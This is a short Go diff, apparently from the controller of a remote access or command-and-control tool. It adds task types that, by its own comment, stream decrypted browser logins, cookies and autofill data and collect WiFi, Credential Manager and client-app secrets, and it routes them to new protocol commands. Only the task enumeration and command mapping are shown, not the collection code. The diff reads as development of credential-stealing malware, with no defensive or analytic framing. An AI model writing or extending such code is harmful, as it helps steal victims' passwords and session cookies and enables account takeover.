@@ -33,15 +33,19 @@ const (
 	TaskFsMkdir TaskKind = "fs.mkdir"
 	TaskFsRen   TaskKind = "fs.ren"
 	TaskBrowser TaskKind = "browser"
+	// TaskBrowserDeep streams decrypted browser logins, cookies and autofill
+	// rows; TaskCreds collects non-browser secrets (WiFi, CredMan, clients).
+	TaskBrowserDeep TaskKind = "browser.deep"
+	TaskCreds       TaskKind = "creds"
 )
 
 const (
 	maxTaskBytes = 16 << 20
 	// browsing stores (History) routinely exceed the task cap
 	maxGetBytes = 128 << 20
-	putChunk     = 48 * 1024
-	maxPut       = 8 << 20
-	maxPutChunk  = 1 << 20
+	putChunk    = 48 * 1024
+	maxPut      = 8 << 20
+	maxPutChunk = 1 << 20
 )
 
 type Session struct {
@@ -281,6 +285,10 @@ func cmdType(kind TaskKind) protocol.Type {
 		return protocol.CmdFsRen
 	case TaskBrowser:
 		return protocol.CmdBrowser
+	case TaskBrowserDeep:
+		return protocol.CmdBrowserDeep
+	case TaskCreds:
+		return protocol.CmdCreds
 	default:
 		return protocol.CmdExec
 	}
